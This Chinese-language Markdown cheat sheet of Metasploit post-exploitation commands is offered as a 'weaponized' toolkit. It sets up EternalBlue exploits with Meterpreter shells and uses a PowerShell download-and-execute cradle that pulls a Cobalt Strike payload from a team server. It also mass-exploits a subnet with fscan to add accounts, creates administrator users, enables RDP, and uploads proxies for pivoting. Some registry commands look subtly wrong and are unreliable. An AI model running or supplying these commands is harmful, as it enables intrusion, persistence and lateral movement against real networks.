# MSF后渗透命令集合开启3389等（军事化）

## MSF命令

### ms17010

```bash
# 使用正向TCP
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD  payload/windows/x64/meterpreter/bind_tcp
set LPORT 54444
set RHOST [ip]
exploit

# 使用反向tcp
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD  payload/windows/x64/meterpreter/reverse_tcp
set LPORT 38777
set RHOST [ip]
exploit
```

### CS上线

1. 在msf session直接执行powershell上线CS，免上传文件，只能打第一层网络

```bash
load powershell
powershell_execute "IEX ((new-object net.webclient).downloadstring('http://TeamServer—ip:33211/bugs'))"


IEX ((new-object net.webclient).downloadstring('http://192.168.137.231:33211/bugs'))
```

### 添加账号开启3389

```bash
# fscan，添加一个账号  sysadmin  密码1qaz@WSX!@#4  只支持x64
fscan.exe -h 192.168.1.0/24 -m ms17010 -sc add
# 启用guest账号，并添加为管理员
fscan.exe -h 192.168.1.0/24 -m ms17010 -sc guest


# 开启3389并且添加用户
run post/windows/manage/enable_rdp username="synb123" password="qqNBNo.1"

# 仅开启3389
run post/windows/manage/enable_rdp

# 转发3389端口到本地6662
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662

# 进入主机shell
shell

# 备用cmd命令
net user synb123 qqNBNo.1 /add
net localgroup administrators synb123 /add
## 查看用户
net user synb123
```

### 添加自动路由

```bash
run post/multi/manage/autoroute
```

### 上传代理

```
upload qqproxy/qqproxy.exe c:\\qqproxy.exe
```

### 后台执行一个exe

```
execute -f c:\\qqproxy.exe
```



### 使用socks代理

```bash
setg Proxies socks5:ip:41088

setg ReverseAllowProxy true
```

## 附录：

WMIC命令开3389

```
wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call
    setallowtsconnections 1
wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call
        setuserauthenticationrequired 1
```
注册表开启3389

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

注册表关闭3389

`REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f`

查rdp端口

```
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber
```
